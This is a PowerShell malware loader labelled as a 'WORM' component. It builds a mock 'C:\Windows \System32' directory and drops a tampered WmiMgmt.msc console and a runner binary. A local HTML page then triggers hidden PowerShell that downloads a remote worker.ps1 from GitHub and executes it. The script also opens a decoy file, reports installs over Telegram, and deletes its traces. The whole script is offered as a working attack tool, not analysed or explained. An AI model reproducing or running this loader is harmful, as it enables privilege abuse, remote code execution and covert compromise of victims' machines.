$port = 8080
$htmlLoaderUrl = "http://localhost:$port"
$originalConsole = ""
$hackedConsole = ""
$interpreter = ""
$fakeFile = ""
$runnerPath = "C:\\Windows \\System32\\Interpreter\\runner.exe"#Google Abusing
$Command = "$runnerPath"
$Arg = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `& {Invoke-RestMethod -Uri `'https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/zakrep/worker.ps1`' | Invoke-Expression}"
if ($debug){
	Write-Host "[+] Params Passed." -ForegroundColor Green
}

if ($debug){
	Write-Host "[*] Make Server on: http://localhost:$port/" -ForegroundColor Green
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
$listener.Start()
New-Item "\\?\C:\Windows \System32\" -ItemType Directory -ErrorAction SilentlyContinue > $null
New-Item "\\?\C:\Windows \System32\en-US" -ItemType Directory -ErrorAction SilentlyContinue > $null
New-Item "\\?\C:\Windows \System32\Interpreter" -ItemType Directory -ErrorAction SilentlyContinue > $null
$decodedBytesInterpreter = [System.Convert]::FromBase64String($interpreter)
$decodedBytesOriginal = [System.Convert]::FromBase64String($originalConsole)
$decodedBytesFakes = [System.Convert]::FromBase64String($hackedConsole)

if ($debug){
	Write-Host "[+] Make consoles." -ForegroundColor Green
}

[System.IO.File]::WriteAllBytes("C:\Windows \System32\WmiMgmt.msc", $decodedBytesOriginal)
[System.IO.File]::WriteAllBytes("C:\Windows \System32\en-US\WmiMgmt.msc", $decodedBytesFakes)
[System.IO.File]::WriteAllBytes("$runnerPath", $decodedBytesInterpreter)
(Get-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc' -Raw) -replace '{htmlLoaderUrl}', $htmlLoaderUrl | Set-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc'

if ($fakeFile -ne $null -and $fakeFile -ne "") {
	if ($debug){
		Write-Host "[WORM] Fake file opened: `n$fakeFile" -ForegroundColor Green
	}
    Start-Process $fakeFile
	$message = "$($redExclamation) [WORM] Fake file opened: `n$fakeFile"
	Send-TelegramMessage -message $message
}

while ($listener.IsListening) {
	if ($global::debug){
		Write-Host "[*] Command received." -ForegroundColor Green
	}
	Start-Process -FilePath 'C:\Windows \System32\WmiMgmt.msc'
    $context = $listener.GetContext()
    $response = $context.Response
    $html =
@"
<html>
<head>
	<title>Game Over</title>
	<meta charset="UTF-8">
</head>
<body>
<script>
	external.ExecuteShellCommand("$Command", "", "$Arg", "Minimized");
	external.ExecuteShellCommand("$runnerPath", "", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command & {taskkill /f /im mmc.exe}", "Minimized");
</script>
</body>
</html>
"@
	$buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
	$response.ContentLength64 = $buffer.Length
	$response.OutputStream.Write($buffer, 0, $buffer.Length)

	$response.Close()
	$listener.Stop()
}


if ($debug){
	Write-Host "[+] Wait" -ForegroundColor Green
}

Start-Sleep -Seconds 30

if ($debug){
	Write-Host "[+] Sending Callback" -ForegroundColor Green
}

$message = "[WORM] Application Installed"
Send-TelegramMessage -message $message

if ($debug){
	Write-Host "[!] Cleanning" -ForegroundColor Green
}

Remove-Item -Path "\\?\C:\Windows \System32" -Recurse -Force
Remove-Item -Path "\\?\C:\Windows \System32\en-US" -Recurse -Force
Remove-Item -Path "\\?\C:\Windows \System32\Interpreter" -Recurse -Force
Remove-Item -Path "\\?\C:\Windows \" -Recurse -Force